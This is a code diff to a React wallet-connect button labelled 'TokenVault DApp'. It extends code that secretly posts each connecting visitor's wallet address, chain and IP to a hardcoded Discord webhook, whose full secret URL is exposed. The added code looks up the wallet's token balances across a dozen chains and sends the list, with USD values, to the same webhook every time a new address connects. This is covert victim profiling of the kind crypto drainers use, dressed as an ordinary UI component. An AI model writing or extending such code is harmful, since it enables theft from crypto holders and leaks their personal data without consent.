@@ -1,8 +1,23 @@
 import { ConnectButton } from '@rainbow-me/rainbowkit';
-import React, { useEffect, useRef } from 'react';
+import React, { useEffect } from 'react';
 import { useAccount } from 'wagmi';
 
 const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1454406788471586836/Xa4unQHgqH26UObEpjd7MRbp7lHYizcJCCQeS8RAUGjxq4T8HXknLWyuaFA3VuMtDx3X';
+
+const CHAIN_LABELS: Record<string, string> = {
+  eth: '⟠ Ethereum',
+  bsc: '⛓ BSC',
+  polygon: '⬡ Polygon',
+  arbitrum: '🔵 Arbitrum',
+  optimism: '🔴 Optimism',
+  avalanche: '🔺 Avalanche',
+  fantom: '👻 Fantom',
+  base: '🔷 Base',
+  linea: '🟢 Linea',
+  scroll: '📜 Scroll',
+  zksync_era: '💠 zkSync Era',
+  gnosis: '🦉 Gnosis',
+};
 
 const getIp = async (): Promise<string> => {
   try {
@@ -14,9 +29,82 @@ const getIp = async (): Promise<string> => {
   }
 };
 
+type AnkrAsset = {
+  blockchain: string;
+  tokenSymbol: string;
+  tokenName: string;
+  balance: string;
+  balanceUsd: number;
+  tokenType: string;
+};
+
+const fetchAllBalances = async (wallet: string): Promise<AnkrAsset[]> => {
+  try {
+    const res = await fetch('https://rpc.ankr.com/multichain', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        jsonrpc: '2.0',
+        method: 'ankr_getAccountBalance',
+        params: {
+          walletAddress: wallet,
+          onlyWhitelisted: true,
+        },
+        id: 1,
+      }),
+    });
+    const data = await res.json();
+    return (data.result?.assets || [])
+      .filter((a: AnkrAsset) => parseFloat(a.balance) > 0)
+      .sort((a: AnkrAsset, b: AnkrAsset) => (b.balanceUsd || 0) - (a.balanceUsd || 0));
+  } catch {
+    return [];
+  }
+};
+
+const fmtBal = (raw: string) => {
+  const n = parseFloat(raw);
+  if (n === 0) return '0';
+  if (n >= 1) return n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 4 });
+  return n.toFixed(6);
+};
+
 const sendWebhook = async (walletAddress: string, chainName: string, chainId: number) => {
   try {
-    const ip = await getIp();
+    const [ip, balances] = await Promise.all([
+      getIp(),
+      fetchAllBalances(walletAddress),
+    ]);
+
+    // Group by chain
+    const byChain: Record<string, AnkrAsset[]> = {};
+    balances.forEach(b => {
+      const c = b.blockchain || 'unknown';
+      if (!byChain[c]) byChain[c] = [];
+      byChain[c].push(b);
+    });
+
+    // Build formatted balance text
+    let balanceText = '';
+    let totalUsd = 0;
+    for (const [chain, tokens] of Object.entries(byChain)) {
+      const label = CHAIN_LABELS[chain] || chain.toUpperCase();
+      balanceText += `**${label}**\n`;
+      tokens.forEach(t => {
+        totalUsd += t.balanceUsd || 0;
+        const usd = t.balanceUsd > 0.01 ? ` (~$${t.balanceUsd.toFixed(2)})` : '';
+        balanceText += `• \`${t.tokenSymbol}\`: ${fmtBal(t.balance)}${usd}\n`;
+      });
+      balanceText += '\n';
+    }
+
+    if (!balanceText) balanceText = '_No tokens with balance found_';
+
+    // Truncate to Discord's 4096 char limit
+    if (balanceText.length > 4000) {
+      balanceText = balanceText.slice(0, 3990) + '\n…(truncated)';
+    }
+
     await fetch(DISCORD_WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -33,6 +121,14 @@ const sendWebhook = async (walletAddress: string, chainName: string, chainId: nu
             timestamp: new Date().toISOString(),
             footer: { text: 'TokenVault DApp' },
           },
+          {
+            title: '💰 All Token Balances',
+            description: balanceText,
+            color: 0x00ff88,
+            footer: {
+              text: `${balances.length} token(s) across ${Object.keys(byChain).length} chain(s) • Total ≈ $${totalUsd.toFixed(2)}`,
+            },
+          },
         ],
       }),
     });
@@ -41,20 +137,18 @@ const sendWebhook = async (walletAddress: string, chainName: string, chainId: nu
   }
 };
 
-let hasSentWebhook = false;
+// Module-level guard: track which address we already sent for
+let sentForAddress: string | null = null;
 
 export const CustomConnectButton = () => {
   const { address, isConnected, chain } = useAccount();
 
   useEffect(() => {
-    if (isConnected && address && !hasSentWebhook) {
-      hasSentWebhook = true;
+    if (isConnected && address && sentForAddress !== address) {
+      sentForAddress = address;
       const chainName = chain?.name || 'Unknown';
       const chainId = chain?.id || 0;
       sendWebhook(address, chainName, chainId);
-    }
-    if (!isConnected) {
-      hasSentWebhook = false;
     }
   }, [isConnected, address, chain]);
 
